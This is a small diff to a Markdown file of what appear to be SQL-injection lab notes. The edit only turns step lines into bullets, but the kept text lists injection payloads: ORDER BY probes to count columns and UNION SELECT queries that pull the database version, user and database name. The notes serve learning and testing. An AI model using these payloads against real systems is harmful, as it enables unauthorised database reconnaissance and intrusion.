@@ -30,17 +30,17 @@ $result=mysql_query($getid) or die('
 ' );
 ```
 
-Figure out how many columns are there:
+* Figure out how many columns are there:
 
 `‘ ORDER BY 1#`
 `‘ ORDER BY 2#`
 
 etc.
 
-Find out the database version:
+* Find out the database version:
 
 `‘ UNION ALL SELECT 1,@@VERSION#`
 
-Find out the database the user is running as and the name of the database:
+* Find out the database the user is running as and the name of the database:
 
 `‘ UNION ALL SELECT user(),database()#`
